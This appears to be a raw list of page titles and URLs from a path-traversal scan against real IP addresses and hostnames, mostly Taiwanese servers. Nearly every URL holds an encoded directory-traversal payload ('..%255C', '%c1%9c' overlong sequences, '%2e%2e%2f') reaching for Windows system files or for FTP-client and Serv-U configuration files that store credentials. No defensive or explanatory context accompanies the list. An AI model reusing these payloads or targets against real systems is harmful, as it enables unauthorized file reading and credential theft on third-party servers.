admin,http://210.202.233.151/login1/typo3/components//..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cboot.ini
ColdFusion Administrator Login,http://210.202.233.142/login1/%252525c1%2525259c..%252525c1%2525259c..%252525c1%2525259c..%252525c1%2525259c..%252525c1%2525259c..%252525c1%2525259c..%252525c1%2525259c..%252525c1%2525259c/windows/1C88ABIzbrO.ini
urchin (5|3|admin),http://222.156.247.175/login1/downloader/components//%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fwindows/win.ini
Gateway Configuration Menu,http://61-62-66-149-adsl-tpe.dynamic.so-net.net.tw/login/account/flashFXP.ini
Apache Tomcat,http://windchill.rd.fic.com.tw/login_out/%2522/.%255C..%255C.%255C..%255C.%255C..%255C.%255C..%255C.%255C..%255C.%255C..%255C.%255C..%255C.%255C..%255Cwindows/win.ini
VIDEO WEB SERVER,http://210.200.17.190/login/ovcgi/impex/flashFXP.ini
Execution of this s?ri?t not permitted,http://biene-3.switch.ch/%2522serv-u.ini/php.ini
Usage Statistics for,http://cy210-202-233-161.ell.static.apol.com.tw/login/.br/gs/components/com_extcalendar/serv-u.ini
"Welcome to the Advanced Extranet Server, ADVX!",https://203.114.74.50:8443/search/servlet/admin/php.ini
porter2/full.ini at master - GitHub,https://github.com/markfullmer/porter2/blob/master/test/Datasets/full.ini
